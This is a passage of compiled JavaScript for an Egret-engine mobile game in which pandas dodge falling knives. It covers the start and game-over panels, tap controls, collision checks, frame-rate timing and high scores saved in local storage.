            window.haveShare || window.haveGamelist || (this.game_reset = new egret.Bitmap, this.game_reset.texture = RES.getRes("restart"), this.game_reset.x = Main.stageW / 2 - this.game_reset.width / 2, this.game_reset.y = this.frame.y + 540, this.game_reset.touchEnabled = !0, this.game_reset.addEventListener(egret.TouchEvent.TOUCH_TAP, this.reset,
                this), this.score_show.addChild(this.game_reset));
            a = new egret.BitmapText;
            a.spriteSheet = RES.getRes("HelloBitmapFont_fnt");
            a.anchorX = a.anchorY = 0.5;
            a.x = this.frame.x + this.frame.width / 2;
            a.y = this.frame.y + 130;
            a.text = b.Knifes.counts ? b.Knifes.counts + "" : b.Infernal_K.counts + "";
			
			var mescore=b.Knifes.counts;
			var mefont="分";
			var melevel="";
			dp_submitScore(mescore);
			document.getElementById("toolbar").style.display="block";
            this.score_show.addChild(a);
            b.Knifes.counts ? this.apotheosis(b.Knifes.counts) : this.apotheosis(b.Infernal_K.counts);
            this.addChild(this.score_show);
            this._max_score()
        }

        __extends(a, d);
        a.prototype.apotheosis = function (a) {
            11 > a ? this.title("lv1") :
                20 >= a ? this.title("lv2") : 30 >= a ? this.title("lv3") : 50 >= a ? this.title("lv4") : 70 >= a ? this.title("lv5") : this.title("lv6")
        };
        a.prototype.title = function (a) {
            var b = new egret.Bitmap;
            b.texture = RES.getRes(a);
            b.x = Main.stageW / 2 - b.width / 2;
            b.y = this.frame.y + 360;
            this.score_show.addChild(b)
        };
        a.prototype._max_score = function () {
            if (window.localStorage.getItem(this.localStorage_score_name)) {
                this.max_value = window.localStorage.getItem(this.localStorage_score_name);
                var a = b.Knifes.counts ? b.Knifes.counts : b.Infernal_K.counts;
                a > this.max_value &&
                window.localStorage.setItem(this.localStorage_score_name, a + "")
            } else this.max_value = b.Knifes.counts ? b.Knifes.counts : b.Infernal_K.counts, window.localStorage.setItem(this.localStorage_score_name, this.max_value + "");
            this._score()
        };
        a.prototype._score = function () {
            this.max_score.spriteSheet = RES.getRes("HelloBitmapFont_fnt");
            this.max_score.anchorX = this.max_score.anchorY = 0.5;
            this.max_score.text = window.localStorage.getItem(this.localStorage_score_name) + "";
            this.max_score.x = this.frame.x + this.frame.width / 2 + 80;
            this.max_score.y =
                this.frame.y + 200;
            this.score_show.addChild(this.max_score)
        };
        a.prototype.showTips = function () {
			dp_share();
        };
        a.prototype.reset = function () {
            this.removeChildren();
            this.dispatchEvent(new egret.Event("reset"));
			document.getElementById("toolbar").style.display="none";
        };
        a.prototype.back = function () {
            this.removeChild(this.tips);
            this.score_show._visible = !0
        };
        a.prototype._more = function () {
           clickMore();
        };
        return a
    }(egret.DisplayObjectContainer);
    b.GameOverPanel = e;
    e.prototype.__class__ = "pander.GameOverPanel"
})(pander || (pander = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(a) {
            d.call(this);
            this.tweenPlay_4 = this.tweenPlay_3 = this.tweenPlay_2 = this.tweenPlay_1 = this.status_4 = this.status_3 = this.status_2 = this.status_1 = !1;
            this.root = a;
            this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
            this.timer = new egret.Timer(2E3)
        }

        __extends(a, d);
        a.prototype.onAddToStage = function () {
            this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
            this.stage.addEventListener(egret.TouchEvent.TOUCH_TAP, this.touchTap, this);
            this.createGameScene()
        };
        a.prototype.createGameScene = function () {
            this.gameBg = new b.InfernalBackground;
            this.addChild(this.gameBg);
            this.panderer = new b.InfernalPander(1, "bigpanda_json", "bigpanda_png");
            this.panderer2 = new b.InfernalPander(2, "bigpanda_json", "bigpanda_png");
            this.panderer3 = new b.InfernalPander(3, "bigpanda_json", "bigpanda_png");
            this.panderer4 = new b.InfernalPander(4, "bigpanda_json", "bigpanda_png");
            this.a = this.panderer.pander.x;
            this.b = Main.stageW / 2 - Main.middle + this.panderer.height / 2;
            this.c = Main.stageW -
            Main.egde + Main.middle / 2 + this.panderer.width - this.panderer.height / 2;
            this.d = this.panderer2.pander.x;
            this.addChild(this.panderer);
            this.addChild(this.panderer2);
            this.addChild(this.panderer3);
            this.addChild(this.panderer4);
            this.showScore = new egret.Bitmap;
            this.showScore.texture = RES.getRes("infernal_score");
            this.showScore.x = Main.stageW / 2 - this.showScore.width / 2;
            this.showScore.y = Main.stagaH / 2 - this.showScore.height / 2;
            this.addChild(this.showScore);
            this.score = new egret.BitmapText;
            this.score.spriteSheet = RES.getRes("HelloBitmapFont_fnt");
            this.score.anchorX = this.score.anchorY = 0.5;
            this.score.x = Main.stageW / 2;
            this.score.y = Main.stagaH / 2;
            this.score.text = "0";
            this.addChild(this.score);
            this.k1 = new b.Infernal_K(!1, !0);
            this.k2 = new b.Infernal_K(!0, !0);
            this.k3 = new b.Infernal_K(!1, !1);
            this.k4 = new b.Infernal_K(!0, !1);
            this.addChild(this.k1);
            this.addChild(this.k2);
            this.addChild(this.k3);
            this.addChild(this.k4);
            this.k1.addEventListener("knifes_stop", this.gameViewStop, this);
            this.k2.addEventListener("knifes_stop", this.gameViewStop, this);
            this.k3.addEventListener("knifes_stop",
                this.gameViewStop, this);
            this.k4.addEventListener("knifes_stop", this.gameViewStop, this);
            this.k1.addEventListener("showOver", this.showOver, this);
            this.k2.addEventListener("showOver", this.showOver, this);
            this.k3.addEventListener("showOver", this.showOver, this);
            this.k4.addEventListener("showOver", this.showOver, this);
            this.screen = new egret.Shape;
            this.screen.graphics.beginFill(0, 0.5);
            this.screen.graphics.drawRect(0, 0, Main.stageW, Main.stagaH);
            this.screen.graphics.endFill();
            this.screen.width = Main.stageW;
            this.screen.height =
                Main.stagaH;
            this.screen.touchEnabled = !0;
            this.screen.addEventListener(egret.TouchEvent.TOUCH_TAP, this.fire, this);
            this.addChild(this.screen);
            this.tips = new egret.Bitmap;
            this.tips.texture = RES.getRes("tips");
            this.tips.x = Main.stageW / 2 - this.tips.width / 2;
            this.tips.y = Main.stagaH / 2 - 0.3 * this.tips.height;
            this.addChild(this.tips)
        };
        a.prototype.gameViewUpdate = function (a) {
            this.score.text = b.Infernal_K.counts + "";
            this.k1.move(this.panderer.pander);
            this.k2.move(this.panderer2.pander);
            this.k3.move(this.panderer3.pander);
            this.k4.move(this.panderer4.pander)
        };
        a.prototype.fire = function () {
            this.removeChild(this.tips);
            this.removeChild(this.screen);
            this.addEventListener(egret.Event.ENTER_FRAME, this.gameViewUpdate, this)
        };
        a.prototype.gameViewStop = function (a) {
            this.removeEventListener(egret.Event.ENTER_FRAME, this.gameViewUpdate, this);
            this.stage.removeEventListener(egret.TouchEvent.TOUCH_TAP, this.touchTap, this)
        };
        a.prototype.showOver = function () {
            this.gameOver = new b.GameOverPanel;
            this.gameOver.addEventListener("reset", this.reset,
                this);
            this.addChild(this.gameOver)
        };
        a.prototype.touchTap = function (a) {
            var b = a.stageX;
            a = a.stageY;
            var d = Main.stageW / 2, e = Main.stagaH / 2;
            b < d && a < e ? this.f1(this.panderer.pander, this.b, this.a) : b > d && a < e ? this.f2(this.panderer2.pander, this.c, this.d) : b < d && a > e ? this.f3(this.panderer3.pander, this.b, this.a) : b > d && a > e && this.f4(this.panderer4.pander, this.c, this.d)
        };
        a.prototype.f1 = function (a, b, d) {
            this.status_1 ? this.tweenPlay_1 || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: d}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") :
                    a.gotoAndPlay("walk-mirr")
            }, this, [!1]), this.tweenPlay_1 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.tweenPlay_1 = this.status_1 = !1
            }, this)) : this.tweenPlay_1 || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: b}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
            }, this, [!0]), this.tweenPlay_1 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.status_1 = !0;
                this.tweenPlay_1 = !1
            }, this))
        };
        a.prototype.f2 = function (a, b, d) {
            this.status_2 ? this.tweenPlay_2 || (this.panderer2.pander.gotoAndPlay("roll"),
                egret.Tween.get(a).to({x: d}, 500).call(function (b) {
                    b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
                }, this, [!1]), this.tweenPlay_2 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.tweenPlay_2 = this.status_2 = !1
            }, this)) : this.tweenPlay_2 || (this.panderer2.pander.gotoAndPlay("roll"), egret.Tween.get(a).to({x: b}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
            }, this, [!0]), this.tweenPlay_2 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.status_2 = !0;
                this.tweenPlay_2 = !1
            }, this))
        };
        a.prototype.f3 = function (a, b, d) {
            this.status_3 ? this.tweenPlay_3 || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: d}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
            }, this, [!1]), this.tweenPlay_3 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.tweenPlay_3 = this.status_3 = !1
            }, this)) : this.tweenPlay_3 || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: b}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
            }, this, [!0]), this.tweenPlay_3 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.status_3 = !0;
                this.tweenPlay_3 = !1
            }, this))
        };
        a.prototype.f4 = function (a, b, d) {
            this.status_4 ? this.tweenPlay_4 || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: d}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
            }, this, [!1]), this.tweenPlay_4 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.tweenPlay_4 = this.status_4 = !1
            }, this)) : this.tweenPlay_4 || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: b}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
            }, this, [!0]), this.tweenPlay_4 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.status_4 = !0;
                this.tweenPlay_4 = !1
            }, this))
        };
        a.prototype.reset = function () {
            this.removeChild(this.gameOver);
            this.dispatchEvent(new egret.Event("search"))
        };
        return a
    }(egret.DisplayObjectContainer);
    b.InfernalContainer = e;
    e.prototype.__class__ = "pander.InfernalContainer"
})(pander || (pander = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(a, e) {
            d.call(this);
            this.kArr = [];
            this.d = 0;
            this.judge = a;
            this.and = e;
            this.clientH = Math.ceil(0.7 * Main.stagaH);
            this.min_height = Math.ceil(0.5 * Main.stagaH);
            this.middle = Math.ceil(0.03 * Main.stageW);
            this.r_h = this.random(this.min_height, this.clientH);
            this.objpool = new b.ObjectPool;
            this.objpool2 = new b.ObjectPool;
            new GameProfiler(this)
        }

        __extends(a, d);
        a.prototype.createKnife = function () {
            this.or = this.random(0, 2) - 1;
            this.edge = Math.ceil(0.05 * Main.stageW) + 50;
            this.m_coordinate = Main.stageW /
            2 - this.middle / 2 - 50;
            if (this.judge)if (this.or) {
                var a = this.objpool2.createObject(b.Knife, !0);
                a.x = Main.stageW / 2 + this.middle / 2 + a.width / 2
            } else a = this.objpool.createObject(b.Knife, !1), a.x = Main.stageW - this.edge; else this.or ? (a = this.objpool2.createObject(b.Knife, !0), a.x = this.edge) : (a = this.objpool.createObject(b.Knife, !1), a.x = this.m_coordinate);
            this.kArr.push(a);
            this.and ? (a.touchEnabled = !0, a.y = 0) : a.y = Main.stagaH / 2 + 100;
            a.anchorX = a.anchorY = 0.5;
            this.addChild(a)
        };
        a.prototype.move = function (c) {
            this.d += 5 * FPS.rateoffest();
            this.d > this.r_h && (this.r_h = this.random(this.min_height, this.clientH), this.createKnife(), this.d = 0);
            for (var d = 0; d < this.kArr.length; d++)this._obj = this.kArr[d], this._obj.y += 2.8 * FPS.rateoffest(), this._obj.y > Math.ceil(Main.stagaH / 2) && this._obj.parent && this._obj.touchEnabled && (this.kArr.shift(), this.removeChild(this._obj), a.counts += 1), this._obj.y > Math.ceil(Main.stagaH) && this._obj.parent && !this._obj.touchEnabled && (this.kArr.shift(), this.removeChild(this._obj), a.counts += 1), b.GameUtil.hitTest(c, this._obj) &&
            this._obj.parent && (this.dispatchEvent(new egret.Event("knifes_stop")), c.y < Main.stagaH / 2 ? (c.gotoAndPlay("hurt"), c.frameRate = 2, egret.Tween.removeAllTweens(), egret.Tween.get(c).to({
                y: Main.stagaH / 2 - c.height,
                visible: !1
            }, 1E3).call(this.showOVer, this)) : (c.gotoAndPlay("hurt"), c.frameRate = 2, egret.Tween.removeAllTweens(), egret.Tween.get(c).to({y: Main.stagaH}, 1E3).call(this.showOVer, this)))
        };
        a.prototype.showOVer = function () {
            this.dispatchEvent(new egret.Event("showOver"))
        };
        a.prototype.random = function (a, b) {
            return Math.ceil(a +
            Math.random() * (b - a))
        };
        a.counts = 0;
        return a
    }(egret.DisplayObjectContainer);
    b.Infernal_K = e;
    e.prototype.__class__ = "pander.Infernal_K"
})(pander || (pander = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a(a, e, l) {
            b.call(this);
            this.main = a;
            this.gameContainer = e;
            this.infernalContainer = l;
            this.global_sprite = new egret.Sprite;
            this.global_sprite.width = Main.stageW;
            this.global_sprite.height = Main.stagaH;
            this.bg = new egret.Bitmap;
            this.bg.texture = RES.getRes("startBg");
            this.bg.width = Main.stageW;
            this.bg.height = Main.stagaH;
            this.bg.x = Main.stageW / 2 - this.bg.width / 2;
            this.global_sprite.addChild(this.bg);
            this.logo = new egret.Bitmap;
            this.logo.texture = RES.getRes("fyzg3");
            this.logo.x =
                Main.stageW / 2 - this.logo.width / 2;
            this.logo.y = 0.1 * Main.stagaH;
            this.global_sprite.addChild(this.logo);
            this.max_s = new egret.Bitmap;
            this.max_s.texture = RES.getRes("score");
            this.max_s.x = Main.stageW / 2 - this.max_s.width / 2;
            this.max_s.y = 0.3 * Main.stagaH;
            this.global_sprite.addChild(this.max_s);
            this.max_value = new egret.BitmapText;
            this.max_value.spriteSheet = RES.getRes("HelloBitmapFont_fnt");
            this.max_value.text = window.localStorage.getItem("local_score_name") + "";
            this.max_value.anchorX = this.max_value.anchorY = 0.5;
            this.max_value.x =
                this.max_s.x + 320;
            this.max_value.y = this.max_s.y + 45;
            this.global_sprite.addChild(this.max_value);
            this.common = new egret.Bitmap;
            this.common.texture = RES.getRes("common");
            this.common.x = Main.stageW / 2;
            this.common.y = 0.5 * Main.stagaH;
            this.common.touchEnabled = !0;
            this.common.anchorX = this.common.anchorY = 0.5;
            this.common.addEventListener(egret.TouchEvent.TOUCH_TAP, this.a, this);
            this.global_sprite.addChild(this.common);
           /* this.inferno = new egret.Bitmap;
            this.inferno.texture = RES.getRes("inferno");
            this.inferno.x = Main.stageW /
            2;
            this.inferno.y = 0.6 * Main.stagaH;
            this.inferno.anchorX = this.inferno.anchorY = 0.5;
            this.inferno.touchEnabled = !0;
            this.inferno.addEventListener(egret.TouchEvent.TOUCH_TAP, this.b, this);
            this.global_sprite.addChild(this.inferno);*/
            this.addChild(this.global_sprite)
        }

        __extends(a, b);
        a.prototype.a = function (a) {
            egret.Tween.get(a._currentTarget).to({scaleX: 0.9, scaleY: 0.9}, 80).wait(100).to({
                scaleX: 1,
                scaleY: 1
            }, 80).call(this.ren, this)
        };
        a.prototype.b = function (a) {
            egret.Tween.get(a._currentTarget).to({scaleX: 0.9, scaleY: 0.9},
                80).wait(100).to({scaleX: 1, scaleY: 1}, 80).call(this.gui, this)
        };
        a.prototype.ren = function () {
            egret.Tween.removeAllTweens();
            this.main.removeChild(this);
            this.main.addChild(this.gameContainer)
        };
        a.prototype.gui = function () {
            egret.Tween.removeAllTweens();
            this.main.removeChild(this);
            this.main.addChild(this.infernalContainer)
        };
        return a
    }(egret.DisplayObjectContainer);
    b.StartPanel = e;
    e.prototype.__class__ = "pander.StartPanel"
})(pander || (pander = {}));
var __extends = this.__extends || function (b, e) {
        function d() {
            this.constructor = b
        }

        for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
        d.prototype = e.prototype;
        b.prototype = new d
    }, Main = function (b) {
    function e() {
        b.call(this);
        this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
        window.autostart = this.shit;
        window.context = this
    }

    __extends(e, b);
    e.prototype.onAddToStage = function (b) {
        e.stagaH = this.stage.stageHeight;
        e.stageW = this.stage.stageWidth;
        e.egde = Math.ceil(0.05 * e.stageW);
        e.middle = Math.ceil(0.03 *
        e.stageW);
        RES.addEventListener(RES.ResourceEvent.CONFIG_COMPLETE, this.onConfigComplete, this);
        RES.loadConfig("resource/resource.json", "resource/")
    };
    e.prototype.onConfigComplete = function (b) {
        RES.removeEventListener(RES.ResourceEvent.CONFIG_COMPLETE, this.onConfigComplete, this);
        RES.addEventListener(RES.ResourceEvent.GROUP_COMPLETE, this.onResourceLoadComplete, this);
        RES.loadGroup("preload")
    };
    e.prototype.onResourceLoadComplete = function (b) {
        "preload" == b.groupName && (RES.removeEventListener(RES.ResourceEvent.GROUP_COMPLETE,
            this.onResourceLoadComplete, this), this.removeEventListener(egret.Event.COMPLETE, this.onAddToStage, this), window.loading.finish(), this.startgame())
    };
    e.prototype.startgame = function () {
        var b = new pander.GameContainer(this), a = new pander.InfernalContainer(this);
        b.addEventListener("search", this.reset, this);
        a.addEventListener("search", this.reset, this);
        this.startPanel = new pander.StartPanel(this, b, a);
        this.addChild(this.startPanel)
    };
    e.prototype.reset = function () {
        pander.Knifes.counts = 0;
        pander.Infernal_K.counts =
            0;
        this.removeChildren();
        this.startgame()
    };
    e.prototype.shit = function () {
        this.removeChildren();
        this.startgame()
    };
    return e
}(egret.DisplayObjectContainer), __extends = this.__extends || function (b, e) {
        function d() {
            this.constructor = b
        }

        for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
        d.prototype = e.prototype;
        b.prototype = new d
    };
(function (b) {
    var e = function (b) {
        function a(a, e) {
            b.call(this);
            this._pander = new egret.MovieClip(RES.getRes("bigpanda_json"), RES.getRes(e));
            this._pander.gotoAndPlay("walk-mirr");
            this._pander.frameRate = 8;
            this._pander.scaleX = this._pander.scaleY = 0.4;
            this._pander.width *= 0.4;
            this._pander.height *= 0.4;
            this.setX(a, this._pander);
            this._pander.y = Math.ceil(0.85 * Main.stagaH) - this._pander.width;
            this._pander.anchorX = this._pander.anchorY = 0.5;
            this._pander.scale = -1;
            this._pander.rotation = -90;
            this.addChild(this._pander)
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "pander", {
            get: function () {
                return this._pander
            }, enumerable: !0, configurable: !0
        });
        a.prototype.setX = function (a, b) {
            switch (a) {
                case 1:
                    b.x = Math.ceil(0.05 * Main.stageW) + this._pander.width - this._pander.height / 2;
                    break;
                case 2:
                    b.x = Main.stageW / 2 + Math.ceil(0.03 * Main.stageW) / 2 + this._pander.width - this._pander.height / 2
            }
        };
        return a
    }(egret.DisplayObjectContainer);
    b.Panders = e;
    e.prototype.__class__ = "pander.Panders"
})(pander || (pander = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(a) {
            d.call(this);
            this.tweenPlay2 = this.tweenPlay = this.onOff = this.status = !1;
            this.root = a;
            this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this)
        }

        __extends(a, d);
        a.prototype.onAddToStage = function () {
            this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
            this.stage.addEventListener(egret.TouchEvent.TOUCH_TAP, this.touchTap, this);
            this.createGameScene()
        };
        a.prototype.createGameScene = function () {
            this.gameBg = new b.GameBackground;
            this.addChild(this.gameBg);
            this.panderer = new b.Panders(1, "bigpanda_png");
            this.panderer2 = new b.Panders(2, "bigpanda_png");
            this.a = this.panderer.pander.x;
            this.b = b.GameBackground.m_coordinate + this.panderer.width / 2;
            this.c = b.GameBackground.secondFinish + this.panderer2.pander.height / 2 - Math.ceil(0.05 * Main.stageW / 1.5);
            this.d = this.panderer2.pander.x;
            this.addChild(this.panderer);
            this.addChild(this.panderer2);
            this.knift = new b.Knifes(!1);
            this.knift2 = new b.Knifes(!0);
            this.addChild(this.knift);
            this.addChild(this.knift2);
            this.knift.addEventListener("knifes_stop",
                this.gameViewStop, this);
            this.knift.addEventListener("showOver", this.showOver, this);
            this.knift2.addEventListener("knifes_stop", this.gameViewStop, this);
            this.knift2.addEventListener("showOver", this.showOver, this);
            this.score = new egret.BitmapText;
            this.score.spriteSheet = RES.getRes("HelloBitmapFont_fnt");
            this.score.anchorX = this.score.anchorY = 0.5;
            this.score.x = Main.stageW / 2;
            this.score.y = 90;
            this.score.text = "0";
            this.addChild(this.score);
            this.screen = new egret.Shape;
            this.screen.graphics.beginFill(0, 0.5);
            this.screen.graphics.drawRect(0,
                0, Main.stageW, Main.stagaH);
            this.screen.graphics.endFill();
            this.screen.width = Main.stageW;
            this.screen.height = Main.stagaH;
            this.screen.touchEnabled = !0;
            this.screen.addEventListener(egret.TouchEvent.TOUCH_TAP, this.fire, this);
            this.addChild(this.screen);
            this.tips = new egret.Bitmap;
            this.tips.texture = RES.getRes("tips");
            this.tips.x = Main.stageW / 2 - this.tips.width / 2;
            this.tips.y = Main.stagaH / 2 - 0.3 * this.tips.height;
            this.addChild(this.tips)
        };
        a.prototype.gameViewUpdate = function (a) {
            this.score.text = b.Knifes.counts + "";
            this.knift.move(this.panderer.pander);
            this.knift2.move(this.panderer2.pander)
        };
        a.prototype.gameViewStop = function (a) {
            this.gameBg.stopEnterFrame();
            this.removeEventListener(egret.Event.ENTER_FRAME, this.gameViewUpdate, this);
            this.stage.removeEventListener(egret.TouchEvent.TOUCH_TAP, this.touchTap, this)
        };
        a.prototype.showOver = function (a) {
            this.gameOver = new b.GameOverPanel;
            this.gameOver.addEventListener("reset", this.echo, this);
            this.addChild(this.gameOver)
        };
        a.prototype.touchTap = function (a) {
            a.stageX < Main.stageW /
            2 ? this.f1(this.panderer.pander, this.b, this.a) : this.f2(this.panderer2.pander, this.c, this.d)
        };
        a.prototype.f1 = function (a, b, d) {
            this.status ? this.tweenPlay || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: d}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
            }, this, [!1]), this.tweenPlay = !0, egret.Tween.get(a).wait(500).call(function () {
                this.tweenPlay = this.status = !1
            }, this)) : this.tweenPlay || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: b}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") :
                    a.gotoAndPlay("walk-mirr")
            }, this, [!0]), this.tweenPlay = !0, egret.Tween.get(a).wait(500).call(function () {
                this.status = !0;
                this.tweenPlay = !1
            }, this))
        };
        a.prototype.f2 = function (a, b, d) {
            this.onOff ? this.tweenPlay2 || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: d}, 500).call(function (b) {
                b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
            }, this, [!1]), this.tweenPlay2 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.tweenPlay2 = this.onOff = !1
            }, this)) : this.tweenPlay2 || (a.gotoAndPlay("roll"), egret.Tween.get(a).to({x: b},
                500).call(function (b) {
                    b ? a.gotoAndPlay("walk") : a.gotoAndPlay("walk-mirr")
                }, this, [!0]), this.tweenPlay2 = !0, egret.Tween.get(a).wait(500).call(function () {
                this.onOff = !0;
                this.tweenPlay2 = !1
            }, this))
        };
        a.prototype.fire = function () {
            this.removeChild(this.tips);
            this.removeChild(this.screen);
            this.addEventListener(egret.Event.ENTER_FRAME, this.gameViewUpdate, this)
        };
        a.prototype.echo = function () {
            this.removeChild(this.gameOver);
            this.dispatchEvent(new egret.Event("search"))
        };
        return a
    }(egret.DisplayObjectContainer);
    b.GameContainer =
        e;
    e.prototype.__class__ = "pander.GameContainer"
})(pander || (pander = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.hitTest = function (a, b) {
            var d = a.getBounds(), e = b.getBounds();
            d.x = a.x;
            d.y = a.y + 15;
            e.x = b.x + 100;
            e.y = b.y;
            return d.intersects(e)
        };
        return b
    }();
    b.GameUtil = e;
    e.prototype.__class__ = "pander.GameUtil"
})(pander || (pander = {}));
var FPS = function () {
    function b() {
    }

    Object.defineProperty(b, "$60", {
        get: function () {
            return GameProfiler.s_fps.toFixed(0)
        }, enumerable: !0, configurable: !0
    });
    b.rateoffest = function (e) {
        void 0 === e && (e = 60);
        return e / b.$60
    };
    Object.defineProperty(b, "counttime", {
        get: function () {
            return GameProfiler.s_time
        }, enumerable: !0, configurable: !0
    });
    return b
}(), GameProfiler = function () {
    function b(b) {
        this._countTime = this._lastTime = this._fps = 0;
        this.run(b)
    }

    b.prototype.run = function (b) {
        b.addEventListener(egret.Event.ENTER_FRAME, this.calculateFPS,
            this)
    };
    b.prototype.calculateFPS = function () {
        var e = egret.getTimer(), d = e - this._lastTime;
        this._countTime += d;
        1E3 <= this._countTime && (this._countTime = 0, b.s_time++);
        this._fps = 1E3 / d;
        this._lastTime = e;
        b.s_fps = this._fps
    };
    b.s_time = 0;
    b.s_fps = 0;
    return b
}(), __extends = this.__extends || function (b, e) {
        function d() {
            this.constructor = b
        }

        for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
        d.prototype = e.prototype;
        b.prototype = new d
    };
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this)
        }

        __extends(a, b);
        a.prototype.onAddToStage = function (a) {
            this.edge = Math.ceil(0.05 * Main.stageW);
            this.middle = Math.ceil(0.03 * Main.stageW);
            this.m_coordinate = Main.stageW / 2 - this.middle / 2;
            this.c_coordinate = Main.stagaH / 2 - this.middle / 2;
            this.r_coordinate = Main.stageW - this.edge;
            RES.getRes("green");
            RES.getRes("blue");
            a = RES.getRes("yellow");
            RES.getRes("purple");
            this.textureHeight = a.textureHeight;
            this.rowCount = Math.ceil(Main.stagaH / this.textureHeight) + 1;
            this.greenArr = [];
            this.blueArr = [];
            this.yellowArr = [];
            this.purpleArr = [];
            for (a = 0; a < this.rowCount; a++) {
                var b = this.createBitmapByName("green"), d = this.createBitmapByName("blue"), e = this.createBitmapByName("yellow"), g = this.createBitmapByName("purple");
                b.y = this.textureHeight * a - (this.textureHeight * this.rowCount - Main.stagaH);
                d.y = this.textureHeight * a - (this.textureHeight * this.rowCount - Main.stagaH);
                e.y = this.textureHeight * a - (this.textureHeight * this.rowCount -
                Main.stagaH);
                g.y = this.textureHeight * a - (this.textureHeight * this.rowCount - Main.stagaH);
                b.width = Main.stageW / 2;
                d.width = Main.stageW / 2;
                e.width = Main.stageW / 2;
                g.width = Main.stageW / 2;
                d.x = Main.stageW / 2;
                e.y = Main.stagaH / 2;
                g.x = Main.stageW / 2;
                g.y = Main.stagaH / 2;
                this.greenArr.push(b);
                this.blueArr.push(d);
                this.yellowArr.push(e);
                this.purpleArr.push(g);
                this.addChild(b);
                this.addChild(d);
                this.addChild(e);
                this.addChild(g)
            }
            this.createGameBg(0, 0, this.edge, Main.stagaH, 0);
            this.createGameBg(this.m_coordinate, 0, this.middle, Main.stagaH,
                0);
            this.createGameBg(0, this.c_coordinate, Main.stageW, this.middle, 0);
            this.createGameBg(this.r_coordinate, 0, this.edge, Main.stagaH, 0)
        };
        a.prototype.createGameBg = function (a, b, d, e, g) {
            var f = new egret.Sprite;
            f.graphics.beginFill(g, 1);
            f.graphics.drawRect(a, b, d, e);
            f.graphics.endFill();
            f.touchEnabled = !0;
            f.width = d;
            f.height = e;
            this.addChild(f)
        };
        a.prototype.createBitmapByName = function (a) {
            var b = new egret.Bitmap;
            a = RES.getRes(a);
            b.texture = a;
            return b
        };
        return a
    }(egret.DisplayObjectContainer);
    b.InfernalBackground = e;
    e.prototype.__class__ =
        "pander.InfernalBackground"
})(pander || (pander = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a(a, e, l) {
            b.call(this);
            this._pander = new egret.MovieClip(RES.getRes(e), RES.getRes(l));
            this._pander.gotoAndPlay("walk-mirr");
            this._pander.frameRate = 8;
            this._pander.scaleX = this._pander.scaleY = 0.4;
            this._pander.width *= 0.4;
            this._pander.height *= 0.4;
            this.setX(a, this._pander);
            this._pander.anchorX = this._pander.anchorY = 0.5;
            this._pander.scale = -1;
            this._pander.rotation = -90;
            this.addChild(this._pander)
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "pander", {
            get: function () {
                return this._pander
            },
            enumerable: !0, configurable: !0
        });
        a.prototype.setX = function (a, b) {
            switch (a) {
                case 1:
